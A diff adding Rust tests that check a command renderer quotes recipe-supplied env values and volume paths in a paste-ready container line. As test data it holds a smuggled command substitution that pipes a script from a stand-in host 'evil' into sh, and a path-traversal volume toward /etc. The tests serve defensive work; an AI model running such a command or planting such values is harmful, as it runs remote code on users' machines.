@@ -202,3 +202,48 @@ fn a_dollar_sign_from_recipe_data_is_still_quoted_in_the_portable_form() {
         "recipe-supplied substitutions must stay inert: {portable}"
     );
 }
+
+/// Recipes arrive from a remote index, so a recipe's `env:` value is data, not
+/// something the shell should interpret. It reaches argv as `-e KEY=<value>`,
+/// and `display_portable` prints the line an operator is told to paste.
+///
+/// The old `is_symbolic` matched by SUBSTRING, so any argument merely
+/// containing `$(id -u)` was emitted unquoted — letting a recipe smuggle a
+/// second command substitution alongside it and have the operator's own shell
+/// run it. The renderer now marks what IT wrote rather than guessing from the
+/// text afterwards.
+#[test]
+fn a_recipe_env_value_cannot_smuggle_a_command_substitution() {
+    let mut c = sample();
+    c.env.insert(
+        "LEAK".to_owned(),
+        "$(id -u)$(curl -s http://evil/x|sh)".to_owned(),
+    );
+    let portable = c.display_portable(Some("/home/spark"));
+    // Quoted, not absent: the operator should still SEE what the recipe asked
+    // for. What must not happen is the shell running it.
+    assert!(
+        portable.contains("-e 'LEAK=$(id -u)$(curl -s http://evil/x|sh)'"),
+        "the env value was not quoted as a single literal argument: {portable}"
+    );
+    // The user block still renders symbolically — quoting it would paste a
+    // command that runs as a user literally named `$(id -u)`.
+    assert!(
+        portable.contains("--user $(id -u):$(id -g)"),
+        "the intended substitution was quoted away: {portable}"
+    );
+}
+
+/// A recipe may name a volume that already begins with `$HOME/`. The renderer
+/// did not write that, so the shell must not expand it.
+#[test]
+fn a_recipe_volume_that_looks_rewritten_is_still_quoted() {
+    let mut c = sample();
+    c.volumes
+        .insert("$HOME/../../etc".to_owned(), "/mnt".to_owned());
+    let portable = c.display_portable(Some("/home/spark"));
+    assert!(
+        !portable.contains(" $HOME/../../etc:/mnt"),
+        "a recipe-supplied $HOME escaped quoting: {portable}"
+    );
+}
